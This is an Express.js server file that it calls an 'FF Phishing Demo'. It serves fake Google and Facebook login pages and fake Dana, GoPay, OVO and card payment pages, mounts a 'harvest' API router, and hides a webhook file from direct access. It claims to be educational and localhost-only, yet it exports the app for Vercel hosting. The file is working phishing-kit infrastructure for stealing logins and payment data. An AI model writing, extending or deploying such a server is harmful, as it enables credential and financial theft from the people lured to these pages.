const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config();

const harvestRoutes = require('./routes/harvest');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Protect webhook.txt from direct web access
app.get('/webhook.txt', (req, res) => {
  res.status(405).send('Method Not Allowed');
});

app.head('/webhook.txt', (req, res) => {
  res.status(405).send('Method Not Allowed');
});

app.post('/webhook.txt', (req, res) => {
  res.status(405).send('Method Not Allowed');
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/checkout', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'checkout.html'));
});

app.get('/login-google', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'login-google.html'));
});

app.get('/login-facebook', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'login-facebook.html'));
});

app.get('/payment-dana', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'payment-dana.html'));
});

app.get('/payment-gopay', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'payment-gopay.html'));
});

app.get('/payment-card', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'payment-card.html'));
});

app.get('/payment-ovo', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'payment-ovo.html'));
});

app.get('/success', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'success.html'));
});

// API Routes
app.use('/api', harvestRoutes);

// Start server only if not in Vercel/Serverless environment
if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`\n🔥 FF Phishing Demo Server Running`);
    console.log(`📍 URL: http://localhost:${PORT}`);
    console.log(`⚠️  EDUCATIONAL PURPOSE ONLY - LOCALHOST ONLY\n`);
  });
}

// Export for Vercel
module.exports = app;
